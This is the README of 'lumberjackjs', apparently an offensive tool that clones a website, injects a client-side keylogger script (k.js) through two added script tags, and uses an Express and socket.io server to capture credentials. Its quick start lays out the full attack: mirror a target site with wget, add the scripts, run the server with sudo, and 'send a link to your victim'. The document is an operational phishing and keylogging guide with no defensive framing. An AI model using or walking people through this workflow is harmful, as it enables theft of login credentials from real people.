lumberjackjs
============

Express and socket.io to capture and send credentials from a victim. Uses client side Javascript to capture keys for seamless site cloning. Simply clone a site, add 2 lines of html, and you're good to go. Send any link to your victim as the server uses a catch all url '*'. No need to setup a full mirror and duplicate directory structure.

#### Quick Start

1. Clone repo and install modules

        git clone https://github.com/tomsteele/lumberjackjs.git
        cd lumberjackjs
        npm install
        
2. Clone a site and mv to index.html

        wget -mk <some site>
        mv <some site>.html index.html
        
3. Add two lines to index.html

        <script src="/socket.io/socket.io.js"></script>
        <script src="/k.js"></script>

4. Start server

        sudo node app

5. Send a link to your victim and capture credentials
        
